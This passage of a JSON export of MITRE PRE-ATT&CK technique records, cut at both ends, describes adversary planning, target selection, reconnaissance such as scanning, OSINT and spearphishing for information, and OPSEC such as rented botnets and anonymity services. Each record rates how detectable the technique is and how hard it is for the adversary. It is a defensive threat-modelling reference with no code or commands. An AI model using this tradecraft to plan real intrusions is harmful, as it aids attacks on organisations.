strategic and operational decisions, knowing the competition, and understanding the competitive situation. KIQs are the critical questions aligned by KIT which provide the basis for collection plans, create a context for analytic work, and\/or identify necessary external operations. (Citation: Herring1999)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Normally, defender is unable to detect.  Few agencies and commercial organizations may have unique insights.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Normal aspect of adversary planning lifecycle.  May not be done by all adversaries.","detection":null,"platforms":[]},{"id":83,"name":"T1234 - Generate analyst intelligence requirements","sort_id":0,"external_id":"T1234","external_sub_id":null,"old_external_id":"PRE-T1011","old_external_sub_id":null,"tactic_id":10,"description":"<p>Analysts may receive Key Intelligence Topics (KITs) and Key Intelligence Questions (KIQs) from leadership or key decision makers and generate intelligence requirements to articulate intricacies of information required on a topic or question. (Citation: Herring1999)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Normally, defender is unable to detect.  Few agencies and commercial organizations may have unique insights.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Normal aspect of adversary planning lifecycle.  May not be done by all adversaries.","detection":null,"platforms":[]},{"id":86,"name":"T1233 - Identify analyst level gaps","sort_id":0,"external_id":"T1233","external_sub_id":null,"old_external_id":"PRE-T1010","old_external_sub_id":null,"tactic_id":10,"description":"<p>Analysts identify gap areas that generate a compelling need to generate a Key Intelligence Topic (KIT) or Key Intelligence Question (KIQ). (Citation: BrighthubGapAnalysis) (Citation: ICD115) (Citation: JP2-01)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Normally, defender is unable to detect.  Few agencies and commercial organizations may have unique insights.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Normal aspect of adversary planning lifecycle.  May not be done by all adversaries.","detection":null,"platforms":[]},{"id":90,"name":"T1225 - Identify gap areas","sort_id":0,"external_id":"T1225","external_sub_id":null,"old_external_id":"PRE-T1002","old_external_sub_id":null,"tactic_id":10,"description":"<p>Leadership identifies gap areas that generate a compelling need to generate a Key Intelligence Topic (KIT) or Key Intelligence Question (KIQ). (Citation: ODNIIntegration) (Citation: ICD115)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Normally, defender is unable to detect.  Few agencies and commercial organizations may have unique insights.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Normal aspect of adversary planning lifecycle.  May not be done by all adversaries.","detection":null,"platforms":[]},{"id":130,"name":"T1235 - Receive operator KITs\/KIQs tasking","sort_id":0,"external_id":"T1235","external_sub_id":null,"old_external_id":"PRE-T1012","old_external_sub_id":null,"tactic_id":10,"description":"<p>Analysts may receive intelligence requirements from leadership and begin research process to satisfy a requirement.  Part of this process may include delineating between needs and wants and thinking through all the possible aspects associating with satisfying a requirement. (Citation: FBIIntelligencePrimer)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Normally, defender is unable to detect.  Few agencies and commercial organizations may have unique insights.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Normal aspect of adversary planning lifecycle.  May not be done by all adversaries.","detection":null,"platforms":[]}]},{"id":12,"name":"Target Selection","source_name":"PRE_ATT_target-selection","sort_id":0,"external_id":"TA0014","category_id":1,"created_at":"2020-06-26 11:56:00","updated_at":"2020-06-26 11:56:00","pivot":{"framework_stage_id":15,"tactic_id":12},"techniques":[{"id":58,"name":"T1245 - Determine approach\/attack vector","sort_id":0,"external_id":"T1245","external_sub_id":null,"old_external_id":"PRE-T1022","old_external_sub_id":null,"tactic_id":12,"description":"<p>The approach or attack vector outlines the specifics behind how the adversary would like to attack the target.  As additional information is known through the other phases of PRE-ATT&amp;CK, an adversary may update the approach or attack vector. (Citation: CyberAdversaryBehavior) (Citation: WITCHCOVEN2015) (Citation: JP3-60) (Citation: JP3-12R) (Citation: DoD Cyber 2015)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Normally, defender is unable to detect.  May change for special use cases or adversary and defender overlays.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"This is the normal adversary targeting cycle where they utilize our poor OPSEC practices to their advantage.","detection":null,"platforms":[]},{"id":63,"name":"T1243 - Determine highest level tactical element","sort_id":0,"external_id":"T1243","external_sub_id":null,"old_external_id":"PRE-T1020","old_external_sub_id":null,"tactic_id":12,"description":"<p>From a tactical viewpoint, an adversary could potentially have a primary and secondary level target.  The primary target represents the highest level tactical element the adversary wishes to attack.  For example, the corporate network within a corporation or the division within an agency. (Citation: CyberAdversaryBehavior) (Citation: JP3-60) (Citation: JP3-12R) (Citation: DoD Cyber 2015)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Normally, defender is unable to detect.  May change for special use cases or adversary and defender overlays.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"This is the normal adversary targeting cycle where they utilize our poor OPSEC practices to their advantage.","detection":null,"platforms":[]},{"id":64,"name":"T1242 - Determine operational element","sort_id":0,"external_id":"T1242","external_sub_id":null,"old_external_id":"PRE-T1019","old_external_sub_id":null,"tactic_id":12,"description":"<p>If going from strategic down to tactical or vice versa, an  adversary would next consider the operational element.  For example, the specific company within an industry or agency within a government. (Citation: CyberAdversaryBehavior) (Citation: JP3-60) (Citation: JP3-12R) (Citation: DoD Cyber 2015)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Normally, defender is unable to detect.  May change for special use cases or adversary and defender overlays.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"This is the normal adversary targeting cycle where they utilize our poor OPSEC practices to their advantage.","detection":null,"platforms":[]},{"id":66,"name":"T1244 - Determine secondary level tactical element","sort_id":0,"external_id":"T1244","external_sub_id":null,"old_external_id":"PRE-T1021","old_external_sub_id":null,"tactic_id":12,"description":"<p>The secondary level tactical element the adversary seeks to attack is the specific network or area of a network that is vulnerable to attack.  Within the corporate network example, the secondary level tactical element might be a SQL server or a domain controller with a known vulnerability. (Citation: CyberAdversaryBehavior) (Citation: JP3-60) (Citation: JP3-12R) (Citation: DoD Cyber 2015)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Normally, defender is unable to detect.  May change for special use cases or adversary and defender overlays.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"This is the normal adversary targeting cycle where they utilize our poor OPSEC practices to their advantage.","detection":null,"platforms":[]},{"id":67,"name":"T1241 - Determine strategic target","sort_id":0,"external_id":"T1241","external_sub_id":null,"old_external_id":"PRE-T1018","old_external_sub_id":null,"tactic_id":12,"description":"<p>An adversary undergoes an iterative target selection process that may begin either broadly and narrow down into specifics (strategic to tactical) or narrowly and expand outward (tactical to strategic).  As part of this process, an adversary may determine a high level target they wish to attack. One example of this may be a particular country, government, or commercial sector. (Citation: CyberAdversaryBehavior) (Citation: JP3-60) (Citation: JP3-12R) (Citation: DoD Cyber 2015)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Normally, defender is unable to detect.  May change for special use cases or adversary and defender overlays.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"This is the normal adversary targeting cycle where they utilize our poor OPSEC practices to their advantage.","detection":null,"platforms":[]}]},{"id":13,"name":"Technical Information Gathering","source_name":"PRE_ATT_technical-information-gathering","sort_id":0,"external_id":"TA0015","category_id":1,"created_at":"2020-06-26 11:56:00","updated_at":"2020-06-26 11:56:00","pivot":{"framework_stage_id":15,"tactic_id":13},"techniques":[{"id":2,"name":"T1247 - Acquire OSINT data sets and information","sort_id":0,"external_id":"T1247","external_sub_id":null,"old_external_id":"PRE-T1024","old_external_sub_id":null,"tactic_id":13,"description":"<p>Open source intelligence (OSINT) is intelligence gathered from publicly available sources. This can include both information gathered on-line, such as from search engines, as well as in the physical world. (Citation: RSA-APTRecon)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"This activity is indistinguishable from legitimate business uses and easy to obtain.  Direct access to the selected target is not required for the adversary to conduct this technique.  There is a limited ability to detect this by looking at referrer fields on local web site accesses (e.g., a person who has accessed your web servers from [https:\/\/www.shodan.io Shodan]).","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Possible to gather technical intelligence about Internet accessible systems\/devices by obtaining various commercial data sets and supporting business intelligence tools for ease of analysis.  Commercial data set examples include advertising content delivery networks, Internet mapping\/traffic collections, system fingerprinting data sets, device fingerprinting data sets, etc.","detection":null,"platforms":[]},{"id":42,"name":"T1254 - Conduct active scanning","sort_id":0,"external_id":"T1254","external_sub_id":null,"old_external_id":"PRE-T1031","old_external_sub_id":null,"tactic_id":13,"description":"<p>Active scanning is the act of sending transmissions to end nodes, and analyzing the responses, in order to identify information about the communications system. (Citation: RSA-APTRecon)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"Yes","detectable_by_common_defenses_explanation":"This technique is an expected and voluminous activity when on the Internet.  Active scanning techniques\/tools typically generate benign traffic that does not require further investigation by a defender since there is no actionable defense to execute.  The high volume of this activity makes it burdensome for any defender to chase and therefore often ignored.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Various available tools and data sources for scouting and detecting address, routing, version numbers, patch levels, protocols\/services running, etc.","detection":null,"platforms":[]},{"id":44,"name":"T1253 - Conduct passive scanning","sort_id":0,"external_id":"T1253","external_sub_id":null,"old_external_id":"PRE-T1030","old_external_sub_id":null,"tactic_id":13,"description":"<p>Passive scanning is the act of looking at existing network traffic in order to identify information about the communications system. (Citation: SurveyDetectionStrategies) (Citation: CyberReconPaper)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Generates no network traffic that would enable detection.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Easy to do but it requires a vantage point conducive to accessing this data.","detection":null,"platforms":[]},{"id":47,"name":"T1249 - Conduct social engineering","sort_id":0,"external_id":"T1249","external_sub_id":null,"old_external_id":"PRE-T1026","old_external_sub_id":null,"tactic_id":13,"description":"<p>Social Engineering is the practice of manipulating people in order to get them to divulge information or take an action. (Citation: SEAttackVectors) (Citation: BeachSE2003)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"No technical means to detect an adversary collecting technical information about a target.  Any detection would be based upon strong OPSEC policy implementation.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Very effective technique for the adversary that does not require any formal training and relies upon finding just one person who exhibits poor judgement.","detection":null,"platforms":[]},{"id":57,"name":"T1260 - Determine 3rd party infrastructure services","sort_id":0,"external_id":"T1260","external_sub_id":null,"old_external_id":"PRE-T1037","old_external_sub_id":null,"tactic_id":13,"description":"<p>Infrastructure services includes the hardware, software, and network resources required to operate a communications environment. This infrastructure can be managed by a 3rd party rather than being managed by the owning organization. (Citation: FFIECAwareness) (Citation: Zetter2015Threats)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"The data is passive in nature or not controlled by the defender, so it is hard to identify when an adversary is getting or analyzing the data.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Based on what the 3rd party infrastructure is, there are many tell tail signs which indicate it is hosted by a 3rd party, such as ASN data, MX or CNAME pointers or IP addresses","detection":null,"platforms":[]},{"id":60,"name":"T1250 - Determine domain and IP address space","sort_id":0,"external_id":"T1250","external_sub_id":null,"old_external_id":"PRE-T1027","old_external_sub_id":null,"tactic_id":13,"description":"<p>Domain Names are the human readable names used to represent one or more IP addresses. IP addresses are the unique identifier of computing devices on a network. Both pieces of information are valuable to an adversary who is looking to understand the structure of a network. (Citation: RSA-APTRecon)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Public or easily obtainable information by design.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"AS and IANA data are easily available, existing research tools.","detection":null,"platforms":[]},{"id":61,"name":"T1259 - Determine external network trust dependencies","sort_id":0,"external_id":"T1259","external_sub_id":null,"old_external_id":"PRE-T1036","old_external_sub_id":null,"tactic_id":13,"description":"<p>Network trusts enable communications between different networks with specific accesses and permissions. Network trusts could include the implementation of domain trusts or the use of virtual private networks (VPNs). (Citation: CuckoosEgg) (Citation: CuckoosEggWikipedia) (Citation: KGBComputerMe)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"This is not easily performed remotely and therefore not a detectable event.  If the adversary can sniff traffic to deduce trust relations, this is a passive activity and not detectable.","difficulty_for_adversary":"No","difficulty_for_adversary_explanation":"Determining trust relationships once internal to a network is trivial.  Simple tools like trace route can show evidence of firewalls or VPNs and then hosts on the either side of the firewall indicating a different trusted network. Active Directory command line tools can also identify separate trusted networks.\n\nIf completely external to a network, sniffing traffic (if possible) could also reveal the communications protocols that could be guessed to be a trusted network connection (e.g., IPsec, maybe SSL, etc.) though this is error-prone. \n\nWith no other access, this is hard for an adversary to do completely from a remote vantage point.","detection":null,"platforms":[]},{"id":62,"name":"T1258 - Determine firmware version","sort_id":0,"external_id":"T1258","external_sub_id":null,"old_external_id":"PRE-T1035","old_external_sub_id":null,"tactic_id":13,"description":"<p>Firmware is permanent software programmed into the read-only memory of a device. As with other types of software, firmware may be updated over time and have multiple versions. (Citation: Abdelnur Advanced Fingerprinting)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"No easy way for defenders to detect when an adversary collects this information.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Depending upon the target device, there are variable ways for an adversary to determine the firmware version.  In some cases, this information can be derived from easily obtained information.  For example, in [http:\/\/www.cisco.com Cisco] devices, the firmware version is easily determined once the device model and OS version is known since it is included in the release notes.","detection":null,"platforms":[]},{"id":71,"name":"T1255 - Discover target logon\/email address format","sort_id":0,"external_id":"T1255","external_sub_id":null,"old_external_id":"PRE-T1032","old_external_sub_id":null,"tactic_id":13,"description":"<p>Email addresses, logon credentials, and other forms of online identification typically share a common format. This makes guessing other credentials within the same domain easier. For example if a known email address is first.last@company.com it is likely that others in the company will have an email in the same format. (Citation: RSA-APTRecon)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Easily determined and not intended to be protected information. Publicly collected and shared repositories of email addresses exist.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Scraping of known email addresses from the target will likely reveal the target standard for address\/username format.  This information is easily discoverable.","detection":null,"platforms":[]},{"id":78,"name":"T1262 - Enumerate client configurations","sort_id":0,"external_id":"T1262","external_sub_id":null,"old_external_id":"PRE-T1039","old_external_sub_id":null,"tactic_id":13,"description":"<p>Client configurations information such as the operating system and web browser, along with additional information such as version or language, are often transmitted as part of web browsing communications.  This can be accomplished in several ways including use of a compromised web site to collect details on visiting computers. (Citation: UnseenWorldOfCookies) (Citation: Panopticlick)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Typical information collected as part of accessing web sites (e.g., operating system, browser version, basic configurations).","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Basic web scripting capability to collect information of interest on users of interest.  Requires a compromised web site and the users of interest to navigate there.","detection":null,"platforms":[]},{"id":79,"name":"T1261 - Enumerate externally facing software applications technologies, languages, and dependencies","sort_id":0,"external_id":"T1261","external_sub_id":null,"old_external_id":"PRE-T1038","old_external_sub_id":null,"tactic_id":13,"description":"<p>Software applications will be built using different technologies, languages, and dependencies. This information may reveal vulnerabilities or opportunities to an adversary. (Citation: CommonApplicationAttacks) (Citation: WebApplicationSecurity) (Citation: SANSTop25)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"Yes","detectable_by_common_defenses_explanation":"Impossible to differentiate between an adversary and a normal user when accessing a site to determine the languages\/technologies used.  If active scanning tools are employed, then the defender has the ability to detect.  However, this is typically not acted upon due to the large volume of this type of traffic and it will likely not prompt the defender to take any actionable defense.  Defender review of access logs may provide some insight based on trends or patterns.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Basic interaction with the site provides insight into the programming languages\/technologies used for a given web site.  Additionally many of the active scanning tools will also provide some insight into this information.","detection":null,"platforms":[]},{"id":92,"name":"T1248 - Identify job postings and needs\/gaps","sort_id":0,"external_id":"T1248","external_sub_id":null,"old_external_id":"PRE-T1025","old_external_sub_id":null,"tactic_id":13,"description":"<p>Job postings, on either company sites, or in other forums, provide information on organizational structure and often provide contact information for someone within the organization. This may give an adversary  information on technologies within the organization which could be valuable in attack or provide insight in to possible security weaknesses or limitations in detection or protection mechanisms. (Citation: JobPostingThreat)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Impossible to differentiate between an adversary and a normal user when accessing open\/public information.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Publicly posted information by design.  Providing too much detail in the job posting could aid the adversary in learning more about the target's environment and possible technical weaknesses\/deficiencies.","detection":null,"platforms":[]},{"id":98,"name":"T1263 - Identify security defensive capabilities","sort_id":0,"external_id":"T1263","external_sub_id":null,"old_external_id":"PRE-T1040","old_external_sub_id":null,"tactic_id":13,"description":"<p>Security defensive capabilities are designed to stop or limit unauthorized network traffic or other types of accesses. (Citation: OSFingerprinting2014) (Citation: NMAP WAF NSE)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"Yes","detectable_by_common_defenses_explanation":"Technically, the defender has the ability to detect.  However, this is typically not performed as this type of traffic would likely not prompt the defender to take any actionable defense.  In addition, this would require the defender to closely review their access logs for any suspicious activity (if the activity is even logged).","difficulty_for_adversary":"No","difficulty_for_adversary_explanation":"The adversary will have some insight into defenses based on dropped traffic or filtered responses.  It is more difficult to pinpoint which defenses are implemented (e.g., [https:\/\/www.fireeye.com FireEye] WMPS, [https:\/\/www.hpe.com Hewlett Packard Enterprise] Tipping Point IPS).","detection":null,"platforms":[]},{"id":101,"name":"T1246 - Identify supply chains","sort_id":0,"external_id":"T1246","external_sub_id":null,"old_external_id":"PRE-T1023","old_external_sub_id":null,"tactic_id":13,"description":"<p>Supply chains include the people, processes, and technologies used to move a product or service from a supplier to a consumer. Understanding supply chains may provide an adversary with opportunities to exploit the technology or interconnections that are part of the supply chain. (Citation: SmithSupplyChain) (Citation: CERT-UKSupplyChain) (Citation: RSA-supply-chain)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Difficult, if not impossible to detect, because the adversary may collect this information from external sources that cannot be monitored by a defender.","difficulty_for_adversary":"No","difficulty_for_adversary_explanation":"Supply chain diversity of sourcing increases adversary difficulty with accurate mapping.  Industry practice has moved towards agile sourcing.","detection":null,"platforms":[]},{"id":103,"name":"T1264 - Identify technology usage patterns","sort_id":0,"external_id":"T1264","external_sub_id":null,"old_external_id":"PRE-T1041","old_external_sub_id":null,"tactic_id":13,"description":"<p>Technology usage patterns include identifying if users work offsite, connect remotely, or other possibly less restricted\/secured access techniques. (Citation: SANSRemoteAccess)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Physical observations, OSINT for remote access instructions, and other techniques are not detectable.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Determine if users work offsite, connect remotely, or other possibly less restricted\/secured access techniques.","detection":null,"platforms":[]},{"id":105,"name":"T1256 - Identify web defensive services","sort_id":0,"external_id":"T1256","external_sub_id":null,"old_external_id":"PRE-T1033","old_external_sub_id":null,"tactic_id":13,"description":"<p>An adversary can attempt to identify web defensive services as <a href=\"https:\/\/www.cloudflare.com\">CloudFlare<\/a>, <a href=\"https:\/\/github.com\/jjxtra\/Windows-IP-Ban-Service\">IPBan<\/a>, and <a href=\"https:\/\/www.snort.org\">Snort<\/a>. This may be done by passively detecting services, like <a href=\"https:\/\/www.cloudflare.com\">CloudFlare<\/a> routing, or actively, such as by purposefully tripping security defenses. (Citation: NMAP WAF NSE)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"Yes","detectable_by_common_defenses_explanation":"Active service detection may trigger an alert.  Passive service enumeration is not detected.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Adversary can passively detect services (e.g., [https:\/\/www.cloudflare.com\/ CloudFlare] routing) or actively detect services (e.g., by purposefully tripping security defenses)","detection":null,"platforms":[]},{"id":107,"name":"T1252 - Map network topology","sort_id":0,"external_id":"T1252","external_sub_id":null,"old_external_id":"PRE-T1029","old_external_sub_id":null,"tactic_id":13,"description":"<p>A network topology is the arrangement of the various elements of a network (e.g., servers, workstations, printers, routers, firewalls, etc.). Mapping a network allows an adversary to understand how the elements are connected or related. (Citation: man traceroute) (Citation: Shodan Tutorial)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"Yes","detectable_by_common_defenses_explanation":"Network mapping techniques\/tools typically generate benign traffic that does not require further investigation by a defender since there is no actionable defense to execute.  Defender review of access logs may provide some insight based on trends or patterns.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Various available tools and data sources for scouting and detecting network topologies.","detection":null,"platforms":[]},{"id":109,"name":"T1257 - Mine technical blogs\/forums","sort_id":0,"external_id":"T1257","external_sub_id":null,"old_external_id":"PRE-T1034","old_external_sub_id":null,"tactic_id":13,"description":"<p>Technical blogs and forums provide a way for technical staff to ask for assistance or troubleshoot problems. In doing so they may reveal information such as operating system (OS), network devices, or applications in use. (Citation: FunAndSun2012)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Cannot detect access to public sites.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Success is dependent upon the existence of detailed technical specifications for target network posted in blogs\/forums.  Poor OPSEC practices result in an adversary gleaning a lot of sensitive information about configurations and\/or issues encountered.","detection":null,"platforms":[]},{"id":121,"name":"T1251 - Obtain domain\/IP registration information","sort_id":0,"external_id":"T1251","external_sub_id":null,"old_external_id":"PRE-T1028","old_external_sub_id":null,"tactic_id":13,"description":"<p>For a computing resource to be accessible to the public, domain names and IP addresses must be registered with an authorized organization. (Citation: Google Domains WHOIS) (Citation: FunAndSun2012) (Citation: Scasny2015)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Open access to DNS registration\/routing information is inherent in Internet architecture.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Proliferation of DNS information makes registration information functionally freely available.","detection":null,"platforms":[]},{"id":139,"name":"T1397 - Spearphishing for Information","sort_id":0,"external_id":"T1397","external_sub_id":null,"old_external_id":"PRE-T1174","old_external_sub_id":null,"tactic_id":13,"description":"<p>Spearphishing for information is a specific variant of spearphishing. Spearphishing for information is different from other forms of spearphishing in that it it doesn't leverage malicious code. All forms of spearphishing are elctronically delivered social engineering targeted at a specific individual, company, or industry. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials, without involving malicious code. Spearphishing for information frequently involves masquerading as a source with a reason to collect information (such as a system administrator or a bank) and providing a user with a website link to visit. The given website often closely resembles a legitimate site in appearance and has a URL containing elements from the real site. From the fake website, information is gathered in web forms and sent to the attacker. Spearphishing for information may also try to obtain information directly through the exchange of emails, instant messengers or other electronic conversation means. (Citation: ATTACKREF GRIZZLY STEPPE JAR)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"Partial","detectable_by_common_defenses_explanation":"Depending on the specific method of phishing, the detections can vary. For emails, filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed. When it comes to following links, network intrusion detection systems (NIDS), firewalls, removing links, exploding shortened links, proxy monitoring, blocking uncategorized sites, and site reputation based filtering can all provide detection opportunities.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Sending emails is trivial, and, over time, an adversary can refine their technique to minimize detection by making their emails seem legitimate in structure and content.","detection":null,"platforms":[]}]}]},{"id":16,"name":"In","tactics":[{"id":1,"name":"Adversary OPSEC","source_name":"PRE_ATT_adversary-opsec","sort_id":0,"external_id":"TA0021","category_id":1,"created_at":"2020-06-26 11:56:00","updated_at":"2020-06-26 11:56:00","pivot":{"framework_stage_id":16,"tactic_id":1},"techniques":[{"id":5,"name":"T1307 - Acquire and\/or use 3rd party infrastructure services","sort_id":0,"external_id":"T1307","external_sub_id":null,"old_external_id":"PRE-T1084","old_external_sub_id":null,"tactic_id":1,"description":"<p>A wide variety of cloud, virtual private services, hosting, compute, and storage solutions are available. Additionally botnets are available for rent or purchase. Use of these solutions allow an adversary to stage, launch, and execute an attack from infrastructure that does not physically tie back to them and can be rapidly provisioned, modified, and shut down. (Citation: LUCKYCAT2012)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"3rd party services highly leveraged by legitimate services, hard to distinguish from background noise.  While an adversary can use their own infrastructure, most know this is a sure- re way to get caught. To add degrees of separation, they can buy or rent from another adversary or accomplice.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Wide range of 3rd party services for hosting, rotating, or moving C2, static data, exploits, exfiltration, etc.","detection":null,"platforms":[]},{"id":6,"name":"T1308 - Acquire and\/or use 3rd party software services","sort_id":0,"external_id":"T1308","external_sub_id":null,"old_external_id":"PRE-T1085","old_external_sub_id":null,"tactic_id":1,"description":"<p>A wide variety of 3rd party software services  are available (e.g., <a href=\"https:\/\/twitter.com\">Twitter<\/a>, <a href=\"https:\/\/www.dropbox.com\">Dropbox<\/a>, <a href=\"https:\/\/www.google.com\/docs\/about\">GoogleDocs<\/a>). Use of these solutions allow an adversary to stage, launch, and execute an attack from infrastructure that does not physically tie back to them and can be rapidly provisioned, modified, and shut down. (Citation: LUCKYCAT2012) (Citation: Nemucod Facebook)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Defender will not have visibility over account creation for 3rd party software services.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"3rd party services like these listed are freely available.","detection":null,"platforms":[]},{"id":8,"name":"T1310 - Acquire or compromise 3rd party signing certificates","sort_id":0,"external_id":"T1310","external_sub_id":null,"old_external_id":"PRE-T1087","old_external_sub_id":null,"tactic_id":1,"description":"<p>Code signing is the process of digitally signing executables or scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Users may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is. (Citation: Adobe Code Signing Cert)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Defender will not know what certificates an adversary acquires from a 3rd party. Defender will not know prior to public disclosure if a 3rd party has had their certificate compromised.","difficulty_for_adversary":"No","difficulty_for_adversary_explanation":"It is trivial to purchase code signing certificates within an organization; many exist and are available at reasonable cost. It is complex to factor or steal 3rd party code signing certificates for use in malicious mechanisms","detection":null,"platforms":[]},{"id":21,"name":"T1306 - Anonymity services","sort_id":0,"external_id":"T1306","external_sub_id":null,"old_external_id":"PRE-T1083","old_external_sub_id":null,"tactic_id":1,"description":"<p>Anonymity services reduce the amount of information available that can be used to track an adversary's activities.  Multiple options are available to hide activity, limit tracking, and increase anonymity. (Citation: TOR Design) (Citation: Stratfor2012)<\/p>","is_deprecated":false,"created_at":"2020-06-26 